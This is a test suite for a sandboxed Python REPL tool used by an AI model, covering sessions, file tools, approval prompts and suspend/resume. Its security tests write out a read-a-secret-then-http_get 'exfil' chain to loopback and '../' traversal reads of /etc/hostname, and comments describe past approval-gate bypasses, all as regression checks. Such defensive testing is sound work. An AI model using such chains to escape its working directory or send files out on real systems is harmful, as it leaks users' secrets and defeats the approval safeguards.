import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, readFileSync, rmSync, existsSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { ReplRunner } from "../src/repl.js";
import type { ApprovalDecision } from "../src/types.js";
import { BRIDGE_TOOLS_SKIP } from "./support/bridge-tools.js";

// ── Helpers ─────────────────────────────────────────────────────

let tmpDir: string;

function makeTempDir(): string {
  tmpDir = mkdtempSync(join(tmpdir(), "repl-test-"));
  return tmpDir;
}

function cleanup(): void {
  if (tmpDir) rmSync(tmpDir, { recursive: true, force: true });
}

// The `deny` / `approve` helpers were deleted in #23 — unused, and the mark of
// a repl_resume round-trip test that was planned and dropped. #48 restores
// them together with that test.
//
// `suspend` is how a test reaches the suspended state at all: it is the answer
// the extension gives for "decide later", and the only route to a session with
// something pending.

const approve = async (): Promise<ApprovalDecision> => true;
const deny = async (): Promise<ApprovalDecision> => false;
const suspend = async (): Promise<ApprovalDecision> => "suspend";

// ── Basic execution ──────────────────────────────────────────────

describe("ReplRunner — basic execution", () => {
  let runner: ReplRunner;

  before(() => {
    const cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("evaluates a simple expression", async () => {
    const out = await runner.run("1 + 2");
    assert.ok(out.includes("[result]"));
    assert.ok(out.includes("3"));
  });

  it("captures print() output", async () => {
    const out = await runner.run('print("hello")');
    assert.ok(out.includes("hello"));
  });

  it("returns last expression value", async () => {
    const out = await runner.run("x = 5\nx * 2");
    assert.ok(out.includes("10"));
  });

  it("returns None for no expression", async () => {
    const out = await runner.run("x = 42");
    assert.ok(out.includes("[result]"));
    assert.ok(out.includes("None"));
  });
});

// ── Session persistence ──────────────────────────────────────────

describe("ReplRunner — session persistence", () => {
  let runner: ReplRunner;

  before(() => {
    const cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("persists variables across runs on same sessionId", async () => {
    await runner.run("x = 42");
    const out = await runner.run("print(x)");
    assert.ok(out.includes("42"));
  });

  it("persists function definitions", async () => {
    await runner.run("def greet(name):\n    return f'Hello, {name}'");
    const out = await runner.run("greet('World')");
    assert.ok(out.includes("Hello, World"));
  });

  it("persists imports", async () => {
    await runner.run("import json");
    const out = await runner.run("json.dumps({'key': 'value'})");
    assert.ok(out.includes('"key"'));
    assert.ok(out.includes('"value"'));
  });

  it("isolates different sessionIds", async () => {
    // Both halves are asserted. The previous version of this test ran the
    // reference to `x` inside `try/except NameError` and asserted only that
    // the output contained "NameError" — which the *source echo* under a
    // typing diagnostic satisfies, since line 3 of that snippet is
    // `except NameError as e:`. It passed whether or not the sessions were
    // isolated. An unresolved name never reaches the runtime to raise
    // `NameError` at all: the type checker rejects it first, on 0.0.18 and
    // 0.0.21 alike (measured).
    await runner.run("x = 100", "session-a");
    const same = await runner.run("x", "session-a");
    assert.ok(same.includes("100"), `session-a should still hold x, got: ${same}`);

    const other = await runner.run("x", "session-b");
    assert.ok(other.includes("used when not defined"), `session-b should not see x, got: ${other}`);
  });
});

// ── Bridge tools ─────────────────────────────────────────────────

describe("ReplRunner — bridge tools", () => {
  let runner: ReplRunner;
  let cwd: string;

  before(() => {
    cwd = makeTempDir();
    // Create a known file for read/grep/find tests
    writeFileSync(join(cwd, "hello.txt"), "hello world\n");
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("can list directory with ls()", async () => {
    const out = await runner.run("ls('.')");
    assert.ok(out.includes("hello.txt"));
  });

  it("can read a file with read()", async () => {
    const out = await runner.run("read('hello.txt')");
    assert.ok(out.includes("hello world"));
  });

  it("can find files with find()", { skip: BRIDGE_TOOLS_SKIP }, async () => {
    const out = await runner.run("find('*.txt')");
    assert.ok(out.includes("hello.txt"));
  });

  it("can grep files with grep()", { skip: BRIDGE_TOOLS_SKIP }, async () => {
    const out = await runner.run("grep('hello', 'hello.txt')");
    assert.ok(out.includes("hello"));
  });
});

// ── Builtin tools ────────────────────────────────────────────────

describe("ReplRunner — builtin tools", () => {
  let runner: ReplRunner;
  let cwd: string;

  before(() => {
    cwd = makeTempDir();
    writeFileSync(join(cwd, "data.txt"), "builtin test\n");
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("can list directory with list_files()", async () => {
    const out = await runner.run("list_files('.')");
    assert.ok(out.includes("data.txt"));
  });

  it("can read a file with read_file()", async () => {
    const out = await runner.run("read_file('data.txt')");
    assert.ok(out.includes("builtin test"));
  });
});

// ── Egress (#42) ────────────────────────────────────────────────

/**
 * The exfiltration chain B3 measured, through the shipped path.
 *
 * The original run was `read('/etc/hostname')` then `http_get` to a loopback
 * listener: **0 prompts**, and the server saw the secret. Both halves are
 * asserted here, because a test that only checks the call failed would pass
 * against an `http_get` broken for some unrelated reason.
 */
describe("ReplRunner — http_get is not a silent egress", () => {
  let runner: ReplRunner;

  before(() => {
    const cwd = makeTempDir();
    writeFileSync(join(cwd, "secret.txt"), "SECRET-VALUE\n");
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("prompts, and denying raises PermissionError", async () => {
    const prompts: string[] = [];
    const out = await runner.run(
      "secret = read_file('secret.txt')\nhttp_get('http://127.0.0.1:9/exfil?d=' + secret)",
      "deny",
      async (req) => {
        prompts.push(req.tool);
        return false;
      },
    );
    assert.deepEqual(prompts, ["http_get"], "the fetch must prompt, and only the fetch");
    assert.match(out, /PermissionError/);
  });

  it("approving still does not reach loopback", async () => {
    const prompts: string[] = [];
    const out = await runner.run("http_get('http://127.0.0.1:9/exfil')", "approve", async (req) => {
      prompts.push(req.tool);
      return true;
    });
    assert.deepEqual(prompts, ["http_get"]);
    assert.match(out, /private or reserved/);
  });
});

// ── The cwd jail (#43) ──────────────────────────────────────────

/**
 * The read half of the same chain, through the shipped path.
 *
 * B3 measured the bridged `read` reaching anything the Pi process could —
 * with no prompt — while `read_file` next to it in the same registry refused.
 * Asserted here at the seam a user actually reaches, because the bridge unit
 * tests construct their own tools and so cannot catch `ReplRunner` handing
 * them the wrong root, or none.
 */
describe("ReplRunner — the read tools cannot leave cwd", () => {
  let runner: ReplRunner;
  let secret: string;

  before(() => {
    const cwd = makeTempDir();
    writeFileSync(join(cwd, "inside.txt"), "IN-ROOT-VALUE\n");
    // Outside the runner's root, and not somewhere the suite may write to.
    secret = "/etc/hostname";
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("refuses an absolute path outside the root, with no prompt", async () => {
    const prompts: string[] = [];
    const out = await runner.run(`read(path='${secret}')`, "jail", async (req) => {
      prompts.push(req.tool);
      return true;
    });
    assert.deepEqual(prompts, [], "a jail that asks is a jail that gets clicked through");
    assert.match(out, /PermissionError/);
    assert.match(out, /outside the project root/, "the refusal must say why");
  });

  it("refuses '..' for read, ls, grep and find alike", async () => {
    for (const call of [
      "read(path='../../etc/hostname')",
      "ls(path='../..')",
      "grep(pattern='root', path='../..')",
      "find(pattern='*', path='../..')",
    ]) {
      const out = await runner.run(call, "jail");
      assert.match(out, /PermissionError/, call);
    }
  });

  it("still reads inside the root", async () => {
    const out = await runner.run("read(path='inside.txt')", "jail");
    assert.match(out, /IN-ROOT-VALUE/);
  });
});

// ── Error handling ──────────────────────────────────────────────

describe("ReplRunner — error handling", () => {
  let runner: ReplRunner;

  before(() => {
    const cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("reports syntax errors", async () => {
    const out = await runner.run("def broken(");
    assert.ok(out.includes("[error: syntax]"));
    assert.ok(!out.includes("[result]"));
  });

  it("reports runtime errors", async () => {
    const out = await runner.run("raise ValueError('test error')");
    assert.ok(out.includes("[error: runtime]"));
    assert.ok(out.includes("test error"));
  });

  it("reports NameError for undefined variables", async () => {
    const out = await runner.run("undefined_var");
    assert.ok(out.includes("[error:"));
  });

  it("reports typing errors", async () => {
    const out = await runner.run("x: int = 'not an int'");
    assert.ok(out.includes("[error: typing]"));
  });

  it("includes stdout before error", async () => {
    const out = await runner.run('print("before crash")\nraise Exception("boom")');
    assert.ok(out.includes("before crash"));
    assert.ok(out.includes("[error:"));
    assert.ok(out.includes("boom"));
  });
});

// ── Reset ────────────────────────────────────────────────────────

describe("ReplRunner — reset", () => {
  let runner: ReplRunner;

  before(() => {
    const cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("clears session state on reset", async () => {
    await runner.run("x = 42");
    runner.reset("default");

    // After reset, x is undefined — Monty catches at type-check time
    const out = await runner.run("print(x)");
    assert.ok(out.includes("[error:"));
    assert.ok(out.includes("not defined"));
  });

  // "reset of non-existent session does not throw" was deleted here in #23 —
  // it had no assertion. The real behaviour it gestured at is a defect: reset
  // reported `Session 'X' reset.` for sessions that never existed ([N12]).
  it("does not claim to have reset a session that never existed", () => {
    assert.deepEqual(runner.reset("never-ran"), { existed: false, revoked: [] });
  });

  it("reports that a session it did reset existed", async () => {
    await runner.run("y = 1", "lived");
    assert.deepEqual(runner.reset("lived"), { existed: true, revoked: [] });
  });
});

// ── Abandon ──────────────────────────────────────────────────────

describe("ReplRunner — abandon", () => {
  let runner: ReplRunner;

  before(() => {
    const cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("distinguishes a session that does not exist from one with nothing pending", async () => {
    assert.equal(runner.abandon("never-ran"), "no-session");

    await runner.run("z = 1", "quiet");
    assert.equal(runner.abandon("quiet"), "nothing-pending");
  });
});

// ── Default sessionId ────────────────────────────────────────────

describe("ReplRunner — default sessionId", () => {
  let runner: ReplRunner;

  before(() => {
    const cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("uses 'default' sessionId when none provided", async () => {
    await runner.run("counter = 1");
    const out = await runner.run("counter");
    assert.ok(out.includes("1"));
  });
});

// ── One approval is one execution (#44) ─────────────────────────

/**
 * The second reproduction in #44, through the shipped path: approve
 * `write('f.txt','v1')` once and the same call, repeated later, used to run
 * **7 times behind 1 prompt**. The gate matched a set of every key ever
 * executed, so a grant had neither a ceiling nor an end.
 *
 * The first test here is also mutation **M22** — dropping `onApproval` from
 * `session.run` in `repl.ts`. Nothing drove an approved gated call through
 * `ReplRunner` and asserted the side effect happened, so the mutant survived:
 * the suite could not tell "approval reaches the session" from "approval is
 * discarded and everything is denied".
 */
describe("ReplRunner — one approval is one execution (#44)", () => {
  let runner: ReplRunner;
  let cwd: string;

  before(() => {
    cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("an approved write really writes — the callback reaches the session (M22)", async () => {
    const prompts: string[] = [];
    const out = await runner.run("write('f.txt', 'v1')", "m22", async (req) => {
      prompts.push(req.tool);
      return true;
    });

    assert.deepEqual(prompts, ["write"], "the write must ask exactly once");
    assert.doesNotMatch(out, /PermissionError/, "an approved write must not be denied");
    assert.equal(readFileSync(join(cwd, "f.txt"), "utf8"), "v1", "and must reach the disk");
  });

  it("repeating that identical call in a later repl call asks every time", async () => {
    const prompts: string[] = [];
    const out = await runner.run(
      "for _ in range(3):\n    write('f.txt', 'v1')\n'done'",
      "m22",
      async (req) => {
        prompts.push(req.tool);
        return true;
      },
    );

    assert.doesNotMatch(out, /PermissionError/);
    // The replayed copy of the first snippet is served from the cache and
    // costs nothing. The three new executions cost three prompts.
    assert.equal(prompts.length, 3, "3 executions must not hide behind an earlier approval");
  });

  it("denying leaves the file untouched", async () => {
    const before = readFileSync(join(cwd, "f.txt"), "utf8");
    const out = await runner.run("write('f.txt', 'DENIED')", "m22-deny", async () => false);

    assert.match(out, /PermissionError/);
    assert.equal(readFileSync(join(cwd, "f.txt"), "utf8"), before);
  });
});

// ── Every tool answers, in every state (#48) ────────────────────

/**
 * The four shipped tools are the model's whole view of this package, and their
 * descriptions instruct it to call them. Two of them could not succeed: a
 * `repl_resume` on a live session threw `Error("No suspended execution to
 * resume")` out of `session.ts`, one line below a branch that answers the
 * no-session case in a friendly sentence.
 *
 * Mutations **M7** (`if (!session)` → `if (true)`) and **M8**
 * (`return session.abandon()` → `return true`) both survived here, because
 * nothing drove `resume()` at all.
 */
describe("ReplRunner — every tool answers, in every state (#48)", () => {
  let runner: ReplRunner;
  let cwd: string;

  before(() => {
    cwd = makeTempDir();
    runner = new ReplRunner(cwd);
  });

  after(cleanup);

  it("resume on a live session with nothing pending answers instead of throwing (M7)", async () => {
    await runner.run("a = 1", "live");

    const out = await runner.resume("live", approve);

    assert.match(out, /nothing waiting for approval/i);
    // M7 turns the no-session guard into `if (true)`, so it would answer the
    // unknown-session sentence for a session that plainly exists.
    assert.doesNotMatch(out, /No session/i);
  });

  it("resume on a session that does not exist keeps its friendly message", async () => {
    const out = await runner.resume("never-ran", approve);
    assert.match(out, /No session 'never-ran' exists/);
  });

  it("names the session in the suspended message", async () => {
    const out = await runner.run("write('s.txt', 'v1')", "named", suspend);

    assert.match(out, /requires approval/);
    assert.match(out, /named/, "the model cannot resume a session it is not told the name of");
    assert.match(out, /repl_resume\(sessionId='named'\)/);
    assert.match(out, /repl_abandon\(sessionId='named'\)/);
  });

  it("suspend → resume(approve) runs the pending call", async () => {
    const suspendedOut = await runner.run("write('ok.txt', 'v1')", "approve-rt", suspend);
    assert.match(suspendedOut, /requires approval/);
    assert.equal(existsSync(join(cwd, "ok.txt")), false, "suspended means not yet run");

    const out = await runner.resume("approve-rt", approve);

    assert.doesNotMatch(out, /PermissionError/);
    // Also the mutant that drops `onApproval` from `session.resume()` (#110):
    // without the callback the resume denies, and nothing reaches the disk.
    assert.equal(readFileSync(join(cwd, "ok.txt"), "utf8"), "v1");
  });

  it("suspend → resume(deny) raises PermissionError in the resumed code", async () => {
    const code = [
      "try:",
      "    write('denied.txt', 'v1')",
      "    result = 'no-error'",
      "except PermissionError:",
      "    result = 'blocked'",
      "result",
    ].join("\n");

    await runner.run(code, "deny-rt", suspend);
    const out = await runner.resume("deny-rt", deny);

    assert.match(out, /blocked/);
    assert.equal(existsSync(join(cwd, "denied.txt")), false);
  });

  it("abandon reports the suspension it discarded, and resume then says so", async () => {
    await runner.run("write('gone.txt', 'v1')", "abandoned", suspend);

    assert.equal(runner.abandon("abandoned"), "abandoned");
    // The pause is over: the same call now finds nothing, and says the other
    // sentence rather than repeating itself.
    assert.equal(runner.abandon("abandoned"), "nothing-pending");

    const out = await runner.resume("abandoned", approve);
    assert.match(out, /nothing waiting for approval/i);
    assert.equal(existsSync(join(cwd, "gone.txt")), false);
  });

  it("reset clears a suspension too, and resume answers afterwards", async () => {
    await runner.run("write('reset.txt', 'v1')", "reset-me", suspend);

    assert.equal(runner.reset("reset-me").existed, true);

    const out = await runner.resume("reset-me", approve);
    assert.match(out, /nothing waiting for approval/i);
    assert.equal(existsSync(join(cwd, "reset.txt")), false);
  });
});
